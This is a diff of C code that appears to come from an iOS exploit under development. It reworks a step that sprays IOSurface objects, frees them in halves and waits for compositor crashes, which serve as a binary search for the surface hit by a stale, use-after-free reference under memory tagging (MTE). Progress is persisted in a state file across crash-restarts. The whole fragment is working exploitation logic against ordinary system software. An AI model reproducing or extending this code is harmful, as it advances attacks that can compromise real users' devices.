@@ -19719,74 +19719,15 @@ new_modes:
                 int r229_mte_match = 0;
                 int r229_match_idx = -1;
 
-                if (r229_phase == 0 && r229_crash_count >= 3) {
-                    /* === PHASE 0: Destructive crash probe ===
-                     * We know races fire (crash_count >= 3).
-                     * Free ALL spray surfaces. If a stale entry points to one,
-                     * the next compositor dispatch reads freed GEN1 memory →
-                     * MTE tag mismatch → kernel panic. If we survive 2s,
-                     * no match this attempt.
-                     */
-                    rlog("  r=229: DESTRUCTIVE PROBE: freeing %d spray surfaces...\n",
-                        r229_spray_n);
+                /* Reset binary search to full range on phase 2 (confirmed match was previous race) */
+                if (r229_phase == 2) {
+                    rlog("  r=229: Previous race confirmed match — fresh search for new race.\n");
+                    r229_bsearch_lo = 0;
+                    r229_bsearch_hi = 255;
+                    r229_phase = 0;
+                }
 
-                    /* Save state: survived=0, keep phase=0.
-                     * If we crash here, next launch knows probe crashed = match confirmed.
-                     * We set phase=1 so next launch enters binary search. */
-                    {
-                        char sp[512];
-                        snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
-                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                        int zero = 0, next_phase = 1;
-                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                        if (sfd >= 0) {
-                            write(sfd, &r229_attempt, sizeof(int));
-                            write(sfd, &r229_crash_count, sizeof(int));
-                            write(sfd, &zero, sizeof(int));
-                            write(sfd, &next_phase, sizeof(int));
-                            int lo = 0, hi = 255;
-                            write(sfd, &lo, sizeof(int));
-                            write(sfd, &hi, sizeof(int));
-                            fsync(sfd);
-                            close(sfd);
-                        }
-                        sync();
-                    }
-
-                    for (int si = 0; si < 256; si++) {
-                        if (r229_spray[si]) {
-                            CFRelease(r229_spray[si]);
-                            r229_spray[si] = NULL;
-                        }
-                    }
-                    r229_spray_n = 0;
-
-                    rlog("  r=229: Spray freed. Waiting 2s for compositor crash...\n");
-                    usleep(2000000);
-                    rlog("  r=229: SURVIVED probe — no MTE match this attempt.\n");
-
-                    /* Survived probe = no match. Reset phase to 0, mark survived. */
-                    {
-                        char sp[512];
-                        snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
-                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                        int one = 1, zero = 0;
-                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                        if (sfd >= 0) {
-                            write(sfd, &r229_attempt, sizeof(int));
-                            write(sfd, &r229_crash_count, sizeof(int));
-                            write(sfd, &one, sizeof(int));
-                            write(sfd, &zero, sizeof(int));
-                            int lo = 0, hi = 255;
-                            write(sfd, &lo, sizeof(int));
-                            write(sfd, &hi, sizeof(int));
-                            fsync(sfd);
-                            close(sfd);
-                        }
-                        sync();
-                    }
-
-                } else if (r229_phase == 0 && r229_crash_count < 3) {
+                if (r229_crash_count < 3) {
                     rlog("  r=229: Only %d crashes, need >= 3 for probe. Looping...\n",
                         r229_crash_count);
                     /* Mark survived for crash tracking */
@@ -19809,26 +19750,27 @@ new_modes:
                         sync();
                     }
 
-                } else if (r229_phase == 1) {
-                    /* === PHASE 1: Binary search for matched surface ===
-                     * Previous launch's destructive probe crashed = confirmed MTE match.
-                     * Now re-race, re-spray, and binary search to find WHICH surface.
+                } else {
+                    /* === In-process binary search + confirmation ===
+                     * crash_count >= 3 confirms races fire.
+                     * Binary search: free half the spray each step.
+                     * - If crash: match in freed half (state file has range)
+                     * - If survive: match in kept half, continue in-process
+                     * - If all freed with no crash: no match, loop
+                     *
+                     * On phase=1, r229_bsearch_lo/hi carry narrowed range
+                     * from a previous crash during binary search.
                      */
-                    rlog("  r=229: BINARY SEARCH phase: range [%d, %d]\n",
-                        r229_bsearch_lo, r229_bsearch_hi);
+                    int bs_lo = r229_bsearch_lo;
+                    int bs_hi = r229_bsearch_hi;
+                    rlog("  r=229: BINARY PROBE: search range [%d, %d]\n", bs_lo, bs_hi);
 
-                    if (r229_bsearch_lo == r229_bsearch_hi) {
-                        rlog("  !!! r=229: Binary search CONVERGED on spray[%d] id=%u!\n",
-                            r229_bsearch_lo,
-                            r229_spray[r229_bsearch_lo] ? IOSurfaceGetID(r229_spray[r229_bsearch_lo]) : 0);
-                        r229_mte_match = 1;
-                        r229_match_idx = r229_bsearch_lo;
-                    } else {
-                        int mid = (r229_bsearch_lo + r229_bsearch_hi) / 2;
-                        rlog("  r=229: Freeing spray[%d..%d], keeping [%d..%d]\n",
-                            r229_bsearch_lo, mid, mid + 1, r229_bsearch_hi);
+                    while (bs_lo < bs_hi) {
+                        int mid = (bs_lo + bs_hi) / 2;
+                        rlog("  r=229: Free spray[%d..%d], keep [%d..%d]\n",
+                            bs_lo, mid, mid + 1, bs_hi);
 
-                        /* Save state: if we crash, match was in [lo, mid] */
+                        /* Save state: if crash, match in [bs_lo, mid] */
                         {
                             char sp[512];
                             snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
@@ -19840,7 +19782,7 @@ new_modes:
                                 write(sfd, &r229_crash_count, sizeof(int));
                                 write(sfd, &zero, sizeof(int));
                                 write(sfd, &phase1, sizeof(int));
-                                write(sfd, &r229_bsearch_lo, sizeof(int));
+                                write(sfd, &bs_lo, sizeof(int));
                                 write(sfd, &mid, sizeof(int));
                                 fsync(sfd);
                                 close(sfd);
@@ -19848,66 +19790,51 @@ new_modes:
                             sync();
                         }
 
-                        /* Free the lower half */
-                        for (int si = r229_bsearch_lo; si <= mid; si++) {
+                        for (int si = bs_lo; si <= mid; si++) {
                             if (r229_spray[si]) {
                                 CFRelease(r229_spray[si]);
                                 r229_spray[si] = NULL;
                             }
                         }
 
-                        rlog("  r=229: Freed lower half. Waiting 1.5s...\n");
+                        rlog("  r=229: Freed [%d..%d]. Waiting 1.5s...\n", bs_lo, mid);
                         usleep(1500000);
 
-                        /* Survived = match is in upper half [mid+1, hi] */
-                        rlog("  r=229: Survived! Match in [%d, %d]\n", mid + 1, r229_bsearch_hi);
-                        r229_bsearch_lo = mid + 1;
-
-                        /* Continue binary search in-process */
-                        while (r229_bsearch_lo < r229_bsearch_hi) {
-                            mid = (r229_bsearch_lo + r229_bsearch_hi) / 2;
-                            rlog("  r=229: Narrowing: free [%d..%d], keep [%d..%d]\n",
-                                r229_bsearch_lo, mid, mid + 1, r229_bsearch_hi);
-
-                            /* Save state for crash case */
-                            {
-                                char sp[512];
-                                snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
-                                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                                int zero = 0, phase1 = 1;
-                                int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                                if (sfd >= 0) {
-                                    write(sfd, &r229_attempt, sizeof(int));
-                                    write(sfd, &r229_crash_count, sizeof(int));
-                                    write(sfd, &zero, sizeof(int));
-                                    write(sfd, &phase1, sizeof(int));
-                                    write(sfd, &r229_bsearch_lo, sizeof(int));
-                                    write(sfd, &mid, sizeof(int));
-                                    fsync(sfd);
-                                    close(sfd);
-                                }
-                                sync();
-                            }
-
-                            for (int si = r229_bsearch_lo; si <= mid; si++) {
-                                if (r229_spray[si]) {
-                                    CFRelease(r229_spray[si]);
-                                    r229_spray[si] = NULL;
-                                }
-                            }
-
-                            usleep(1500000);
-                            rlog("  r=229: Survived! Match in [%d, %d]\n",
-                                mid + 1, r229_bsearch_hi);
-                            r229_bsearch_lo = mid + 1;
-                        }
-
-                        rlog("  !!! r=229: Binary search CONVERGED on spray[%d] id=%u!\n",
-                            r229_bsearch_lo,
-                            r229_spray[r229_bsearch_lo] ? IOSurfaceGetID(r229_spray[r229_bsearch_lo]) : 0);
-                        r229_mte_match = 1;
-                        r229_match_idx = r229_bsearch_lo;
+                        /* Survived — match NOT in freed half */
+                        rlog("  r=229: Survived! Narrowing to [%d, %d]\n", mid + 1, bs_hi);
+                        bs_lo = mid + 1;
                     }
+
+                    /* bs_lo == bs_hi: binary search converged */
+                    if (r229_spray[bs_lo]) {
+                        rlog("  !!! r=229: Binary search CONVERGED on spray[%d] id=%u\n",
+                            bs_lo, IOSurfaceGetID(r229_spray[bs_lo]));
+                        r229_mte_match = 1;
+                        r229_match_idx = bs_lo;
+                    } else {
+                        rlog("  r=229: spray[%d] already NULL — no match.\n", bs_lo);
+                        /* Mark survived, reset state */
+                        {
+                            char sp[512];
+                            snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                                getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                            int one = 1, zero = 0;
+                            int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                            if (sfd >= 0) {
+                                write(sfd, &r229_attempt, sizeof(int));
+                                write(sfd, &r229_crash_count, sizeof(int));
+                                write(sfd, &one, sizeof(int));
+                                write(sfd, &zero, sizeof(int));
+                                int lo_reset = 0, hi_reset = 255;
+                                write(sfd, &lo_reset, sizeof(int));
+                                write(sfd, &hi_reset, sizeof(int));
+                                fsync(sfd);
+                                close(sfd);
+                            }
+                            sync();
+                        }
+                    }
+
                 }
 
                 if (r229_mte_match) {
